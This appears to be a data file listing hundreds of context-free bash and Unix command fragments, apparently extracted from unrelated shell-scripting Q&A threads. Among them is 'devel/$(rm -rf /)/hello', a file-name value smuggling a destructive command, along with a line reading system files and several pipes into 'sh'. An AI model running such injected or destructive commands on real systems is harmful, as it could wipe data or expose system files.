tail -f mct
git show --pretty="format:" --name-only HEAD^
man bash
FILES=$(find ...)
rm $f
printf -- rm $f "\n"
cat -vte file.txt
dos2unix file.txt
cat file.txt |
cat file.txt |  awk '{ print $2,$3,$4,$5,$6,$1 }'
ps --forest
grep -v
numfmt --grouping 12343423455.23353   # -> 12,343,423,455.23353 in locale en_US
groupDigits 12343423455.23353   # -> 12,343,423,455.23353 in locale en_US
(n=$(</dev/stdin); f=${n#*[.,]}; printf "%'.${#f}f\n" "$n") <<<12343423455.23353
n=12343423455.23353; (f=${n#*[.,]} printf "%'.${#f}f\n" "$n")
npm install -g grp-cli
grp -n 12343423455.23353
man printf
man 1 printf
man 3 printf
printf "%'.<numDecPlaces>f"
numfmt --grouping
(LC_ALL='de_DE.UTF-8'; printf "%'.1f\n" 1000) # SHOULD yield: 1.000,0
(LC_ALL='lt_LT.UTF-8'; printf "%'.1f\n" 1000,1) # -> '1 000,1'
cat words.txt | hunspell -1 -G > ok_words.txt
$ cat > myfile.txt
Hello World!
touch /path/to/file
somecommand > /path/to/file
nano /path/to/file
vi /path/to/file
any other editor emacs,gedit etc
'File does not exist'
mkdir /path/to/dir
bash: filename: Permission denied
sudo bash -c 'echo "Foo" > filename'
$ touch NewFile.txt
$ cat NewFile.txt
$ > NewFile.txt
> filename
permission denied
echo "blah" | myscript
ps -fe
ls -lh /proc/self/fd/0
find -exec
mneedham tty7...2012-02-19 11:26 (:0)
mneedham tty7
tr -s ' '
who | tr -s ' '
cut -d" " -f1
find /bin/ -executable
find /bin/ -executable -name "*.sh"
find ~/bin/ -executable | xargs grep --files-with-matches '#!/bin/bash'
2. Loading RVM environment files in shell scripts.
names[$2] = names[$2] " " $5
XXX 2
cut -d' ' -f2,5 file
sort -sk1,1
sed ':a;$!N;s/^\(\(\S\+\).*\)\n\2/\1/;ta;P;D'
min (3, 4, 5, 2, 6)
sort -n
awk -f script filename
ps | grep $PPID
echo $(ps | grep $PPID)
echo ps
ps | grep $PPID
cut -d" " -f4
cut -d" " -f4
echo i abc1def1ghi
i abc def ghi
for loop
for loop
brew install phantomjs
brew install imagemagick
page.clipRect = { top: 10, left: 10, width: 500, height: 500 }
cp -u
rsync -a -v src dst
cp -n
false | cp -i ...
ssh -n
-u 3
printf %q
devel/$(rm -rf /)/hello
find . -name "123*" | awk '{a=$1; gsub(/123_/,""); printf "mv \"%s\" \"%s\"\n", a, $1}' | sh
find . -name 'o3_cloudmed_*.*' -type f -exec bash -c 'mv "$1" "${1/cloudmed/revint}"' -- {} \;
man su
su -c aliased_cmd - myuser
su -l -c aliased_cmd myuser
( cd X ; command )
command arg1 | command --dir=/other_dir arg2
grep -v '^#'
grep -E
find / -name foo*
find / -name foo* | wc -l
wc -l
-type f
wc -l
tail -f file.txt | awk '{total+=$0;count+=1;print total/count}'
if [ X$PID != X ]
VARIABLE="$VARIABLE '\n' SomeData"
find /home/the_peasant -type f
kill script
pstree -a -p 1792
pkill -TERM -P 27325
kill 0
log "$thing" >> "$logfile"
[[ htmlstring =~ "/regex/" ]]
bash ~/.bashrc
$ sh post-receive
bash ~/.bashrc
. /home/you/.bashrc
loop &
kill %loop
ps -e | grep loop
kill -9
pidof loop
pidof bash
kill %loop
man rename
" "
echo "$line"
use 1.8.7
rvm default
rvm --default 1.9.2
rvm get head --auto
pgrep '^Skype$'
ps -cl1
Skype Controller
ps -o
Foo Skype
while read
pgrep myAwesomeAppName
echo | <cmd>
ls $PWD/baz
if [ $? -ne 0 ]
"Today is Day #1"
"Today is Day #2"
date '+%s'
catalina stop
xargs wc -l | grep total
grep -q
readlink -f $mypath
cat /proc/mounts | tail -n 1
;' is encountered.  The string
find . -name README | xargs head -1
-name '*.php'
hg status
$4 == "foo"
substr($4, length($4) - 2) == "foo"
while read
man ps
ps -opid, ucomm
$2 == command
if (! system("kill " $1)) {
head -n 1 file && grep bar file
cat file | ...
sed -i
cat /etc/password
cat /etc/password
cat opml.xml | grep xmlUrl | sed 's/.*xmlUrl="/-u /;s/".*//' | xargs rsstail
[ $words -eq 26 ]
[ $words == 26 ]
[ 26 == 26 ]
templog file
printf '%q'
printf '%q'
this filename has spaces
printf '%q'
sleep 10000 & wait $!
cat $variable
echo $variable >t.h
-bash: dir: command not found
/usr/bin/vim ~/.bashrc
rm -fr
while read src dst; do cp -fr $src $dst; done < directory-mapping-file
( ... )
cd ~
"C:\Program Files\Git\bin\rxvt.exe" -e /usr/bin/bash --login -i
find . -type f -regextype posix-extended -iregex ".*YOUR_PARTIAL_NAME.*" -print
find . -type f -name "*YOUR_PARTIAL_NAME*" -print
find2perl . -type f -name "*YOUR_PARTIAL_NAME*" -print | perl
| perl
qsearch . something
cd /*h*/*d*/*r*/*s*p*l*/*t*
source ~/.zshrc
bindkey '^f'
$0 ~ "XXXX
lynx -dump file.html
-xtype f
-perm /u=x
double tab key press
declare -f
sudo -i myfunc
command sudo
find . -printf "\"%p\"\n"
$( (command) )
echo '\$x'
echo `echo '\$x'`
echo $(echo '\$x')
[ $# -ne 1 ]
[ $# -ne 2 ]
[ $? -eq 0 ]
[ $# -eq 1 ] || [ $# -eq 2 ]
NOT [ $# -eq 1 ] && NOT [ $# -eq 2 ]
[ $# -ne 1 ] && [ $# -ne 2 ]
JMeter -l /dev/stdout
-j /dev/stdout
bash --version
IFS=. echo ...
${BASH_VERSINFO[*]: 0:3}
${BASH_VERSINFO[*]: 0:3}
bash --version
echo $BASH_VERSION
ps -eaf
nohup base64 /dev/urandom &
s/.*/&\nLINE ONE\nLINE TWO/
ff d8 ff d0
-e '1{N;N;N}'
aa ff d9
-e '1{N;N}'
. ar_test.sh
VAR=(aa bb cc)
), the script will run in your current shell (that is,
bash ar_test.sh
#!/usr/bin/env bash
awk { print  }
bash -c
if then
cp --parents
mkdir -p /my/other/path/here && touch $_/cpredthing.txt
echo mkdir -p /code/temp/other/path/here && echo touch $_/cpredthing.txt
cd ..
HISTSIZE=-1 HISTFILESIZE=-1
bash --version
kill -9 %%
ip route
cat $1 | wc -l
wc -l $1 | cut -d " " -f 1
nb_lines=${var%% *}
nb_lines=${var/ */}, but the 2nd form is less portable being
cat -n
yes |
--trust-model always
--passphrase 'SECRET'
--trust-model always
| cat
| sh
0-9 a-z -
not valid
declare -i
1 foo foo foo!
foo foo foo!
$1 + n*500 != $2
echo ${a10}
find . -type f -name '*.php' | xargs egrep -Ho '\{\{[^|]*\|[^}]*\}\}'
{{ "my text" | trans }}
{{ "my_key" | trans }}
make -j8
make -j
complete -F _parse_help ./myscript
./myscript <TAB>
-F function
complete -F
-W wordlist
ps aux|grep ffmpeg
ps aux | grep ffmpeg | wc -l
ps aux | grep ffmpg
tail -F log | python parse.py
tail -f SOMEFILE
for line in f
-msse4.2 [enabled]
ldd commonKT
ls -d
ls -l
ls -ld
ls -d
ls -d */
ls -l "B*"
ls "/tmp/Foo/B*"
ls -d "/tmp/Foo/B*"
ambiguous redirect
awk "/word1/||/word2/||/word3/" filename
WORDS="word1 word2 word3"
./exp_fit efit.inp
mkdir output20
mv at* ./output20
echo /folder1/folderA/filename+(oh+how+nice,+parantheses) | ...
export http_proxy=http://x.x.x.x:x
<< 'EOF'
read [-ers] [-u fd] [-t timeout] [-a aname] [-p prompt] [-n nchars] [-d delim] [name ...]
-t timeout: 
read [-ers] [-a aname] [-d delim] [-i text] [-n nchars] [-N nchars] [-p prompt]
[-t timeout]
[-u fd] [name ...]
-p "prompt "
read -p Prompt
not valid
eval "echo $myArg"
echo {}
bash -c
Can't connect to local MySQL server through socket '/opt/local/var/run/mysql5/mysqld.sock' (20)
which mysql
echo /${a##*/}
find . -regex '.*\.bak' -print0 | du --files0-from=- -ch | tail -1
shopt -s globstar
uniq -c
tr -d '\n'
gem list rails
rails (3.2.1)
rails new testapp -T
Command Not Found: rails
echo $(<file.csv)
$a .= " $_"
rsync -avzP
ls -1
$env = system("which-version")
while read ; do .. done < filename
renamed as [...]
renamed as
chmod +x the_file
user@machine:$ java -classpath /home/user/mysql.jar:/home/user/jericho-html.jar:/home/user JavaFile
>> filename.txt
java (...) 2> errors.txt
curl -is https://foursquare.com/oauth2/access_token?grant_type=authorization_code&client_id=SOME_CLIENT_ID&client_secret=SOME_CLIENT_SECRET&code=notavalidcode&redirect_uri=SOME_REDIRECT_URI > temp.txt
/bin/bash test.sh
echo "Start server"
Test Only
trap <function_name> <arg_1> <arg_2> SIGINT
trap "function arg1 arg2" SIGNAL
trap "ls -lh /" INT
ls -lh /
vim some_text_file
array[0]=1: not found
help select
sort -h -r
single token
--data-binary <data>
(1:6) + 2
sh shell.sh
sh other_shell_scripts.sh
#!/usr/bin/env bash
1.0 2.0
<( )
readarray -t values < <(python file.py)
python file.py
man bash
while read line
if [ grep '...' ... ]; then
grep 'IMPORT\|LINE' <<< "$line"
set -x
/bin/bash -x you_script.sh
find -type d | grep -E '^\./y'
find -type d
find -type d | MyFunction
find -type d | MyFunction
optssh.exp <password>
[[ ]]
[ ]
sort | uniq -c
sort | uniq -c
grep -Z
var="a/b/c"; echo ${var#*/}
echo ${var##*/}
<added text>
Command Grouping
cat -
sed -i <pattern> file
sed -i old <pattern> file
man cat
find . -type f ...
<added text>
| tee myFile.txt
&> /dev/null
0r!echo "${str}"
find . -name "*.tex"
find . -name f1.tex f2.tex
trap SIGCHLD
jobs -n
jobs -l
| 23127           myserver    98.194.263.29 |
a20 is (on) Jan 15
a20 is (on)
[^ ]
[^ ]*
[^ ]+
perl -p -i -e 's/(on).*/(on)/' filename
. %(base_path)s/.duke/bin/env
command_name test1 and "test2"
command_name "test1 and "test2""
test1 and "test2"
test1 and "test2"
test1 and "test2"
test1 and "test2"
-m 1
libdefs.h:363:2: error: expected identifier or '(' before numeric constant
echo -e
read -r
wine $run
echo wine $run
#!/bin/bash -x
This text
run.exe -withoption "This text"
set -x
set +x
filter(os.path.isdir, os.listdir(os.curdir))
a20 is (off) Jan 15
a20 is (on) Jan 16
sed -i '/'$1'/ s/off/on/' /home/josepas/Mantenimiento
sed -i '/'$1'/ s/).*/) /' /home/josepas/Mantenimiento
sed -i "/$1/ s/$/$date/g" /home/josepas/Mantenimiento
find ... -print0
xargs -0
echo "$str" | while read file ; do echo $file; done
while read
while read
while read line ; do ... ; done < $1
cat "$1" |
open(".", O_RDONLY)
fd = open("foo", O_RDONLY|O_NOFOLLOW)
memcached-tool 127.0.0.1:11211 stats
memcached-tool 127.0.0.1:11211
set -o vi
set -o vi
$ man readline
/vi mode bindings
/editing commands
grep --color=auto
grep --color
[ -ne 200]
["$res" -ne 200]
[ -z "$res" -o "$res" -ne 200 ]
[ -z "$res" -o "$res" != "200" ]
[ "$res" != "200" ]
ls > your_file
ls | wc
ls > FileName
ls | grep $myName
ls > grep myFileName
sort < fileName.txt
sort < fileName.txt > sortNewFile.txt
ls | grep myName | awk '{ print $NF }'
command > fileName
echo $PATH
source …/.bashrc
source RVM
source /etc/profile.d/rvm.sh
rvm …
' '
git last
log -1 HEAD
git last
/var/django/server.sh mysite1 start
/var/django/server.sh myothersite start
yum check-update
rpm -q {package}
-o -h -s -p --script --simple --help --output
COMPREPLY=( ... )
cd ..
...; cd somedir; ...; cd ..
sed -i -f dir1.sed A.txt
head -c 2
dd bs=2 count=1
watch your_command
tail -F
tail -f
man tail
chmod 700 ~/bin/watch
watch 1 echo "hi there"
nix-env -iA nixpkgs.watch
. "$HOME/.nix-profile/etc/profile.d/nix.sh"
PROMPT_COMMAND='if [ -f .myapprc -a "$PWD" != "$PWDLAST" ]; then PWDLAST="$PWD"; source .myapprc; fi'
help test
man test
head -n -1
head -n -X
find /path/to/backups -mtime +1 -exec rm {}  \;
ls -il
od -A n -a -v MyFile.log
od -A n -a -v MyFile.log | cleaner
gcc main.c
./a.out outfile <infile
od -a -An -v file
for /(?:esc| fs| gs| us)?(?:(?!esc| fs| gs| us).)*/gs
print "$_\n "
-regex pattern
-path pattern
find . -path "./sr*sc"
find . -path ./src/emacs -prune -o -print
find bar -path /foo/bar/myfile -print
| sh
head -n 1
cut -f1
man cut
read -r
read [-r] var...
" \t\n"
PS1="\n[\u]-> "
echo $0
/patt/ {...}
/^all:/ {$0=$0" anotherthing"}
print $0
echo $PATH
sudo bash -c 'echo $PATH'
which R
which R
chmod 755 filename
unexpected end of file
echo "a b _c d _e f" | sed 's/[ ]*_[a-z]\+//g'
a b d f
_c _e
{ $1}
xargs -n2
vim filename
:% normal Jj
vim -c ":% normal Jj" filename
echo "http://randomurl/suburl/file.mp3" | sed (expression)
sed 's|\([^/]+mp3\)$|\1|g'
ls *.png | xargs myscript.sh
new Tab("some string blah blah blah")
vim db/migrate/*name_of_migration.rb
grep .gz
lsof -i :445
netstat -an |grep 445 |grep LISTEN
man 5 proc
nmap example.com -p 80
Popen(['/bin/sh', '-c', args[0], args[1], ...])
set GIT_TRACE=1
git ls-remote
git ls-remote
git ls-remote
git ls-remote
> /dev/null 2>&1
-print0 | xargs -0
while read
-d $'\0'
find <path> -xdev -type f -name *.txt -exec ls -l {} \;
x=$(find . -name "*.txt")
"the file.txt"
while done
head -c -16
find . -name file.*
ls -l
find . -type f | xargs ls -ldt
apt-get install
exec ssh -tt root@remote 'ruby numbers.rb'
set 2012*; eval FILE=\$$#
cp -r *.jar /destination_dir
man cp
rsync -avm --include='*.jar' -f 'hide,! */' . /destination_dir
(exit $(foo | wc -l))
rsync error: received SIGINT, SIGTERM, or SIGHUP (code 20) at rsync.c(544) [sender=3.0.6]
set -e
trap - EXIT
set -e
set -E
set -m
trap '' SIGINT SIGTERM EXIT
"white on_green"
/bin/ec2-cmd: No such file or directorybe-instances: line 11: /opt/aws/apitools/ec2
export EC2_PRIVATE_KEY=~/.ec2/pk-xxxxx.pem\r\n
dos2unix /usr/local/env
pidof Program_A
sh test.sh 'Hey'
set -e
set -e
bad_command && rc=0
&& rc=$?
&& rc=0
#$ -cwd
#$ -q serial.q
echo $((2#101))
$ chmod 755 some_script.sh
$ ./some_script.sh
./some_script.sh: Command not found.
command not found
ls -F
/bin/ls -F
ls -F
"Quit the server with CONTROL-C"
export LD_LIBRARY_PATH=/mypath
export LD_LIBRARY_PATH=/mypath:$LD_LIBRARY_PATH
man bash
shopt | grep extglob
find ./ -type f -ctime -7 -exec ls {} \; > new.files
cd ../
find ./ -type f -ctime -7 -exec ls {} \; > new.files.from.new.dir
tr -d '\t'
sed -e 's/^ \+//'
1 1.txt
| cut -c1-80
tput cols
| xargs -I line echo -ne 'line\033[0K\r'
xargs: unmatched double quote; by default quotes are special to xargs unless you use the -0 option
ping -c 4 www.stackoverflow.com | tail -1| awk -F '/' '{print $5}'
ping -w1 -c1 8.8.8.8 | tail -1| cut -d '=' -f 2 | cut -d '/' -f 2
ping -w1 -c1 8.8.8.8 | tail -1| cut -d '=' -f 2 | cut -d '/' -f 2 | cut -d '.' -f 1
[[ ]]
set -x
echo $(tty)
Shell Arithmetic
if [ 1000 -lt $(date '+%H%M') -lt 2000 ];
function demoFunction
export DEBUG=TRUE
, "
. run2.sh
$TERM -hold -e script
. run2.sh
sh run2.sh
bash run2.sh
. foo.sh
source foo.sh
run a script
sh ./run2.sh
(chmod +x file.sh)
set -e
return N
N != 0
set -o
return 0
return 0
[[ ... ]]
[ ... ]
find <..> -exec
read -u <filehandle>
git ls-files
git sed
git grep
git grep
git sed -e <your expression> -- <path filter>
git sed '1{/^$/d}'
git sed 's/foo/bar' src tests
git sed -e 's/foo/bar' -e '/bar/d'
echo -e "\a"
sudo -l <user> <cmd>
tail -n
(filepos, chunk)
tail -n
man mail
mysql_command | mail -s "Number of users logged in" example@gmail.com
hostname | awk '{print substr($0,length,1)}' | sed -e "s%\(.*\)%sed -i \"/^auto_increment_offset/s/0/\1/\" /etc/mysql/conf.d/my.cnf %" | sh
echo abcd
rm abcd
case $PATH
exec git --git-dir /home/gcom370p/stu013/express/.git pull /home/gcom370p/stu013/express.git master
grep -E
grep -F
grep -E
echo "adb pull $folder download"
adb shell
-d " "
man bash
man vim
-cf -
-T -
-xf -
-C /some/where/else
test $V = 14
test $V -eq 14
test "$V" = 14
non-Integer Mathematical calculations
sed -n 24356,24356p $FILE
. * [ ] ^ $ +
M-x shell
(info "(emacs) Interactive Shell")
strace -o bash.log bash
"Start" > right-click "Computer" [right side of Start pane] > "Properties" [context menu]
(setq explicit-shell-file-name "/bin/bash")
mkdir /home/<username>
man env
env -i script.sh
exec -c
exec -c $0
env -i
env -i bash
bash -x
exit 1
exit 0
$ which l
$ man l
which l
man l
ls -F
ls -CF
ls -CF
ls -C -F
ls -1
type -a l
man bash
grep -A 1 "string 1" $file | tail -1
grep -B 1 "string 2" $file | head -1
CALC=$((($ENDVAR - $STARTVAR) - 1))
CALC=$(($ENDVAR - $STARTVAR))
'<--string 2-->'
$0, $1
ls *.mp3 > ./id3.sh
ls *.mp3
-n 10
./id3.sh *.mp3
ls *.mp3|xargs ...
for file in "$@"; do ...
for file in $*;do ...
for file in $@; do ...
= "/bowtie..."
$'do\r'' ./test.sh: line 4: 
set -x
./test.sh 1
$$ != $SID
. test.sh 1
$$ == $SID
./test.sh 1
. ./test.sh
source ./test.sh
bash test.sh
bind -P
./script *mp3
man 1 strings
find $PROFILES_PATH -iname '*.pid'
printf "%s" pattern
(( ))
$(( ))
(( ))
@Marc Dechico
@Marc Dechici
printf -v
set -x
xargs echo rm
echo one 'two three' four
grep --null
printf | xargs
'rm "$1" "${1%.*}.extension2"'
Hello, world
man find
history | tail -n1 | perl -npe 's/^\s+\d+\s+//' | yourcommand HOST
./foo.sh: 2: Syntax error: redirection unexpected
< <()
< <(command)
bash -s stable
bash -s
awk '{ s += $1 } END { print "sum: ", s, " average: ", s/NR }' <filename>
xargs -l 2
xargs -L 3
-exec rm -rf {}\;
> btoa
man tee
cygpath -pu 'C:\Users\me\bin;C:\Users\me\project\bin'
cygpath -pw
cygpath -u "/cygdrive/c"
git filter-branch
import os
> config.ini
eval echo foo
eval "echo foo"
killall mysqld
kill -SIGKILL pid
sudo: port: command not found
which port
source !$
source ~/.profile
find . -regextype posix-extended -regex '.*(txt)$'
-regextype posix-extended
find -regextype asdf
<(...) <(...)
$( ... &&  ... )
tee >(cmd1) | cmd2
trap "..." EXIT
( CMD 1 ; CMD 2 ) | CMD 3
sorted a z z unique a z
cat words.txt | gzip
Connection Closed By *IP*; Couldn't read packet: Connection reset by peer.
man ssh
man sshpath
ssh username@host
application/x-empty; charset=binary
NLS_LANG="CZECH_CZECH REPUBLIC.UTF8" export NLS_LANG
cp -al $BUP/hourly.2 $BUP/daily.0 ;
cp -al
mv $BUP/daily.0 $BUP/daily.1
cp -al $BUP/hourly.2 $BUP/daily.0
mv $BUP/hourly.2 $BUP/daily.0
ls -1 | grep .*keyword.*keyword.*
system(". setenv.sh | cat")
/usr/bin/emacs .bash_profile
/usr/bin/emacs .bash_profile
while [ $line_index -lt 3 ]; do
man builtins
seq 0 2
for i in $(seq 0 $((${#c[*]}-1)))
for i in $(seq 0 $((2-1)))
for i in $(seq 0 1)
for i in 0 1
ps aux | grep SimulatedRpu
ps aux | grep SimulatedRpu
set shell=bash -l
command not found
$ man bash
set -x
find $HOME/bin $HOME/dev -type d  -regex ".*\/py\(\w\|-\w\)*"
-v var
read -p "Enter [y/n] : " opt
help read
read -p
echo -n
#!/usr/bin/env bash
Folder 1
Folder 1
Folder 2
$( ... )
while read line ... done < ${file}
echo "ABC|DEF|GHI" | sed 's/\([A-Z]*\)\|/\L\1/'
man bash
Parameter expansion
source countries.sh country
tar -zcf my-dir.tar.gz -s /^my-dir/your-dir/ my-dir/*
tar -zxf my-dir.tar.gz -s /^my-dir/your-dir/
sed -i
file $(readlink -f $(type -p rename))
test -f $f_
-t 1
error setting terminal attributes: Interrupted system call
-t 0
help read
-t 0
-t 0
printf %q
bash arguments.sh arg1 arg2 arg3
BAR=$(eval echo $BAR)
/dev/null 2>&1
--output text
set -x
export -f
local f
export -f f7zipi
-a myArray
cd -
cd -
cd -
cd /var/local/someplace/else
cd -
cd -
which echo
/bin/echo -e "\n"
Sat Mar 17 01:48:45 ICT 2012
bash -i 2>&1 | tee
[ Some string = "* string" ]
[[ ]]
[ ]
sed 's/<div.class="SectionText">\(.*\)<\/div>/\1/g'
sed -i "" ...sedCmd.... fileName
man sed
-n, --quiet, --silent
-e script, --expression=script
rake assets:precompile
somedevice -getevent
stdbuf -oL somedevice -getevent > my_record_file
find ... -print0 | du --files0-from=-
while [] ; do
sed 's/$/\t1/g'
alias $SHORTTEXT='$LONGTEXT'
alias testit='cd ~'
alias $SHORTTEXT="$LONGTEXT"
find . -name '*.txt'
alias test='find . -name '\''*.txt'\'''
eval "alias $SHORTTEXT='$LONGTEXT'"
alias test='find . -name *.txt'
echo '*.txt'
chmod 755 my_awesome_script
man tempfile
this || that
echo $$
2> /dev/null
command1 || command2
declare -A englishDictionaryArray
array2=( one.a  tree.c )
echo "foo" >&2
echo "foo" 1>&2
{ echo "foo" 2>&1 >&2 ; } > /dev/null
{ echo "foo" >&2 ; } > /dev/null 2>&1
id[1]=string2: not found
echo :$string: #outputs spaces between the 2 ::
if [ -z "$string" ] #because of white space will always evaluate to true
x=echo $string | tr -d ' '; if [ -z "$string" ];
[[ ... ]]
shopt -s extglob
2>&1 > /your/file/
30/10/20010 --> 30/10/2010
30/16/2005 --> 30/06/2005
java -version
export TESTVARIABLE
. test2.sh
echo $SHELL
xargs --show-limits
using Export
using Source
set -a
set -a
set +a
set -a
set +a
Usage: ups {start|stop|restart|status}
Usage: ../../usr/bin/ups {start|stop|restart|status}
grep | sed
show full processlist;
50 rows in set
> notify grep -r "hard_to_find_word" /some/huge/directory/
comm -1 wordlist.txt text.txt
grep -wc $line text.txt
alias="cd $directory"
( bash )
cd $directory
( bash | cd )
( bash -c cd)
( bash | cd )
( bash | cd )
( ( bash ) | ( cd ) )
nslookup $ip | grep name
"\macro{30\percent of bears eat fish.}"
$(echo ...)
bash xx
sh xx
perl -pane '$rr = qr/{[^{}]*(??{$rr})*[^{}]*}/; s/$rr//g;' input.txt | grep -n '[{}]'
engineering notation
fgrep -l
find / -type f \( -name \*.php -o -name \*.sh \) -exec grep 'into tbl_free_minutes_mar' {} /dev/null \;
find / ...
find /home ...
pr -bt3 <input.txt
[[ ' myword ' =~ [[:\<:]]myword[[:\>:]] ]] && echo YES # OK
[[ '*' =~ ^'*' ]]
bash 3.x
\ ^ $ [ {  . ? * + ( ) |
[[ ... ]]
& ; < > space
[[ '<word>' =~ \<word\> ]] && echo YES
[[ 'boo' =~ ^\boo ]] && echo YES
[[ ' word ' =~ \\<word\\> ]] && echo YES
[[ '\boo' =~ ^\\boo ]] && echo YES
printf %s \\\<word\\\>
[[ ' \<word\> ' =~ \\\<word\\\> ]] && echo YES
grep -E
grep -E
[[ ... ]]
find -name bak -type d -exec du -ch '{}' \;
du -hcs
-exec ... +
rake hello
%{echo "World!"}
%x{echo "World!"}
%x{echo "World!"}
system( cmd )
{verbose: false}
|| exit
|| exit 0
%x( expr )
%x( expr )
sh "expr"
sh "irb"
grep -c data
grep -c data
while :; do [command]; done
while :; do echo "test" && sleep 1; done
while :; do php myscript.php; done
 "$dbinfo" -eq 'y' 
  "$dbinfo" == "y" 
cat file
expr $c +1
/dir/file.jpg /dir/dir2/bla.jpg
cp /source/**/* /destination
OPTIND - 1
man date
echo bar/"{}"
printf %s\0 bar/"{}"
cd foo/ ; find | sort
cd bar/ ; find | sort
diff -r -q foo/ bar/
-d recurse
grep -ri --include=*.txt "sometext" *
find . -type d -perm 777
-type d
<?php shell_exec("php sleep.php"); ?>
php sleep.php &
ini_set('max_execution_time', 0);
do... while
git add forms<tab>
exec("mv ...")
cp php.ini $x
cat ...
cat propagation.txt
['/bin/sh', '-c', 'bash', 'whatever']
['/bin/sh', '-c', 'bash whatever']
set -x
filename with spaces
-d ''
xterm -e ...
xterm -e ...
od -x
chmod +x <scriptname.sh>
jobs -l
set -v
set -x
set -v
set -v
bash -x your_script
tr a-z n-za-m
grep -F
grep -f
tmpfs /mnt/ramdrive tmpfs size=1G  0 0
grep -P
find -exec extract.sh {} \+
-bash: ``/R': not a valid identifier
set -x
grep '\$foo\[\'\''bar\'\''\]' ...
date --date "2012-02-13" +%s
date --date @datetime
sudo man path_helper
and then use
echo -e "\007"
cat -> echo -> less -> awk -> perl
cat | echo | less | awk | perl
cat "somefile.txt" | echo
cat "somefile.txt" | grep "pattern"
split( string, array, [fieldsep] );
-e $newindex's/.*/NEWNEW/'
indent -kr -i8
mv "somedir" "/path/to/directory/somedir"
ps -aux
find . ! -regex '.*/new_subdir' ! -regex '.' -exec cp -r '{}' new_subdir \;
! -regex '.'
cp -r !(new_subdir) new_subdir
mv * new_subdir ; cp -r new_subdir/* .
man re_format
-iregex '[0-9]{8}'
IMG_0001 2.JPG
IMG_0001 3.JPG
ps aux | grep process_name
ps aux
ps aux
1 p
ps | grep x
file%with two spaces
cat -n
ls $options $directory
ls "-A" ~
pidof dbServer
ps -f
-o ppid
>> file
touch file
-r 0.1
-t duration
Restrict the transcoded/captured video sequence to the duration specified in seconds.  "hh:mm:ss[.xxx]" syntax is also supported.
script.sh &
"echo this; echo that"
./wrapper.sh "alert@somethingbadhappened.com" "echo this; echo that"
sh -c
wc -m
git checkout branchname
git checkout branchna...
complete -F
git checkout
complete -F
bash: [: 1: unary operator expected 
complete -F
$(info $(shell ($(LOCAL_PATH)/echo_test.sh)))
-bash: var_name=5: command not found
script --arg1=val
declare -g
declare -g
export -n
changepagestring -o -v infile.pdf search-regex replace-str outfile.pdf
[[  ]]
(x[2]>100 && x[2]<700)
export PATH=/usr/local/bin
PATH=$PATH:$HOME/.rvm/bin # Add RVM to PATH for scripting
echo $PATH
awk  '/Loop/ { printf $4, }' log*weak*"$factor"x
wc -w
wc -w filename.txt
sh ./wordcount.sh
sh ./wordcount.sh
source ~/.bashrc
sh scriptname
-h -e -l -p
(( ... ))
/usr/bin/git ls-files
help complete
git ls-files
git ls-files
git ls-files
git ls-files
git diff-index
git rm dir/fil<TAB>
git ls-files
git diff-index
git ls-files
git diff-index
while read line
[ -z "$var" ]
set -e
set -e
set -e
foo && bar
[[ -n "$ws" ]] || die "whatever"
set -e
return 0
curl http://www.wikipedia.org/ | html2pdf_bash_command > /tmp/wikipedia.org.pdf
find . -type f -mtime -1 -exec ls -l {} \;
awk -F\; '{print $1 FS $2 FS substr($0, index($0, $4))}' temp.txt
sed 's/www-test/www/g' -i /home/websync/tmp/sitio-oficial/sitios/wp-config.php
set -e
"exit 1"
gcc -Wall
type gpm
declare -f gpm
cat table* >glued_sqldump.sql
$( ...)
net helpmsg
net helpmsg 2
The system cannot find the file specified.
chmod +x
rm -r
rm -rf
info find
xmlstarlet ed
sed $'s/./&\\\n/g'
sed 's/./&\n/g'
fold -w1
while IFS= read -r -n1 -d '' c; do printf %s\\n "$c"; done
-d ''
gawk -F '' 'OFS="\n"{$1=$1}1'
awk 'BEGIN{FS="";OFS="\n"}{$1=$1}1'
wget --quiet -O - linkname
echo $xx
echo "$xx"
/  }
${VARIABLE//-/ }
ls: cannot access /some/long/path/README.TXT: No such file or directory
read -r
cmp -s
2-3 (BC)
netcat -U
nice -n 10 bash -c 'your; commands | or_complex pipelines'
passwd -e
set -e
help test
set -e
... && BOOL=0 || BOOL=1
[[ "$PROCEED" == "y" ]] && should_proceed=true || should_proceed=false
rm origin
cat other.sh
sed -e "s//Users/rojcyk/Documents//Volumes/backMeUp/main/"
qdbus org.kde.konsole /Konsole newSession
help fg
help bg
man bash
echo $0
set -u
myscript.sh 3
for i in {1..$1}
for i in {1..3}
sw_vers -productVersion
sh ../executable1
cp ../dir5/dir4/dir3/dir2/* .
cat << EOF
sleep 10
sleep 7 &
| cat
echo 123
exec ls>out
exec ls>out1 ls>out2
this too
{ cmd1; cmd2; }
(cmd1; cmd2)
exec >stdout 4<input 5>>append
exec foo >stdout 4<input 5>>append
exec foo >output
exec >/dev/tty
exec foo
cat -E
cat -vET
cat -E
| cat -E
> out
> out
6> out
(exec f)
ls>out1 ls>out2
ls ls
>out1 >out2
sed -i 's/(alpha[1],alpha[2])/(i,j)/g' $filetowork
sed -i 's/\(alpha\[1\],alpha\[2\]\)/i,j/g' $filetowork
ps -ef |grep script.bash
9 9 9
12 12 12
9 9 11
12 12 14
$1 $1 $1+2
var ="$1 $1 $1"
var ="$1 $2 $3"
var ='$1 $1 $1'
var ='$1 $2 $3'
echo foo && echo bar >file
a && b && c
a || exit 1; b || exit 1; c
set -e
cd $PROJECT_DIR
"cd $PROJECT_DIR"
cd $PROJECT_DIR
do script "set" in window 1
do script "echo $PROJECT_DIR" in window 1
/bin/rm {}
| cat
read line
read -r line
address=`echo $line ...
address=`echo "$line" ...
[ ! $? ]
&& break 1
'$address' -dumpstream -dumpfile '$2.wmv' -vf scale\=320\:240
command ...
echo \b
./myprogram st
find ./assets ...
find ./ -maxdepth 1
-printf "%A@
sort -z -n
while read -d '' date line
echo "$line"
ls -t
myscript.sh E*
~/Library/Android/sdk/tools/emulator -list-avds
~/Library/Android/sdk/tools/emulator @AVD_NAME
exec tcsh
< div style="left:0px; top:0px; width:100%; height:63px; border-style: solid; border-width: 1px; background-color:#FCF0C4; border-color:#E87511; border-style: solid; border-width: 1px; position:absolute;" >
< div  style="left:2px; top:32px; width:744px; height:27px; display:block; border-style: solid; border-width: 1px; position:absolute; overflow:hidden; background-color:#ffffff;" >
man rename
man zshmisc
current process
man zsh*
ssh user@server 'mysql -uimauser -p imadb -e "select * from table"'
#!/bin/bash -e
|| :
bash -e
bbedit ~/bin/foo
echo "${BASH_SOURCE[0]}"
source by workflow
source by convention
find the first available, ignore rest
